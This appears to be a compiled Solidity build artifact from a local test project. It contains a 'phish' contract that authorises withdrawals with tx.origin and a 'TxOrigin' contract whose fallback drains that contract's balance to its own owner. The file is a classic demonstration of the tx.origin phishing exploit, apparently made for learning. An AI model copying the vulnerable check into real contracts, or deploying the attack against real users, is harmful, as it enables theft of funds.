{
  "contractName": "phish",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_recipient",
          "type": "address"
        }
      ],
      "name": "withdrawAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102a8806100536000396000f3fe6080604052600436106100385760003560e01c8063893d20e8146100415780638da5cb5b1461006c578063fa09e630146100975761003f565b3661003f57005b005b34801561004d57600080fd5b506100566100c0565b60405161006391906101fc565b60405180910390f35b34801561007857600080fd5b506100816100e9565b60405161008e91906101fc565b60405180910390f35b3480156100a357600080fd5b506100be60048036038101906100b991906101c4565b61010d565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff161461016557600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101ab573d6000803e3d6000fd5b5050565b6000813590506101be8161025b565b92915050565b6000602082840312156101d657600080fd5b60006101e4848285016101af565b91505092915050565b6101f681610217565b82525050565b600060208201905061021160008301846101ed565b92915050565b60006102228261023b565b9050919050565b60006102348261023b565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61026481610229565b811461026f57600080fd5b5056fea2646970667358221220a93f5a24c9c103737e5cf91629d688dcea27cdbf66c0c9151cc4a37a69ed56a864736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ncontract phish {\r\n    address public owner;\r\n    constructor ()payable  {\r\n    owner = msg.sender;\r\n    }\r\n    receive() external payable{}\r\n\r\n    fallback() external payable{}\r\n\r\n    function withdrawAll (address payable _recipient) public {\r\n        require(tx.origin == owner);\r\n        _recipient.transfer(address(this).balance);\r\n    }\r\n    function getOwner() public view returns(address) {\r\n        return owner;\r\n    }\r\n}\r\n\r\ncontract TxOrigin {\r\n    address  owner;\r\n    phish PH;\r\n   //event Deposit(address addr,uint amount);\r\n\r\n    constructor(address phishAddr) {\r\n        owner = msg.sender;\r\n        PH=phish(payable(phishAddr));\r\n    }\r\n   \r\n   function deposit() payable public {\r\n      //emit Deposit(msg.sender, msg.value);\r\n   }\r\n\r\n    function attack() internal {\r\n        address phOwner = PH.getOwner();\r\n        if (phOwner == msg. sender) {\r\n            PH.withdrawAll(payable(owner));\r\n        } else {\r\n            payable(owner).transfer(address(this). balance);\r\n        }\r\n    }\r\n    fallback() external payable{\r\n        attack();\r\n    }\r\n}",
  "sourcePath": "D:\\Test\\Test1\\contracts\\phish.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-08T03:40:18.894Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}